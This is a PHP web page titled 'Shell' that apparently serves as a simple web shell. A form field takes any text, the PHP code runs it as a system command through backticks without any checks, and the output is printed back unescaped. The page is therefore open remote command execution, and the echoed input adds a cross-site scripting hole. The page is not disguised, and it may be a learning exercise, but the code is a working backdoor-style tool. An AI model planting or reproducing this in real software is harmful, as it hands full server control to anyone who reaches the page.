<!DOCTYPE html>
<html lang="en">

<head>
    <!-- title -->
    <link rel="icon" href="./img/powershell_icon.ico" type="image/icon type">
    <title>Shell</title>
    <!-- meta data  -->
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- icon and css file link  -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <!-- for php file -->
    <style><?php include './css/navbar.css'; ?></style>
    <style><?php include './css/search.css'; ?></style>

</head>

<body>
    <!-- navbar  -->
    <div class="navbar">
        <a href="index.php"><i class="fa fa-fw fa-home"></i> Home</a>
        <a class="active" href="shell.php"><i class="fa fa-fw fa-terminal"></i>Shell</a>
        <a href="contact.php"><i class="fa fa-fw fa-envelope"></i> Contact</a>
    </div>

    <!-- main body -->
    <div class="main">
        <div class="search_btn">
            <form class="example" action="shell.php" method="post" style="margin:auto;max-width:300px">
                <input type="text" placeholder="Enter Command.." name="cmd_command">
                <button type="submit" name="sumbit" value = "submit"><i class="fa fa-search"></i></button>
            </form>
        </div>
        <h2>OUTPUT</H2>
        <div class="output">
            <div>
                <?php
                    $command = 'echo Enter any system command and get output in the output window.';
                    if (!empty($_POST['cmd_command']))
                    {
                        $command = $_POST["cmd_command"];
                        echo "<b>Command : </b>".$command;
                    }
                    $system_info = `$command`;
                    echo "<pre>$system_info</pre>";
                ?>
            </div>
        </div>
    </div>
    <!-- footer  -->
    <div class="footer">
        <span>Copyright 2022 by Refsnes Data. All Rights Reserved.</span>
    </div>
</body>

</html>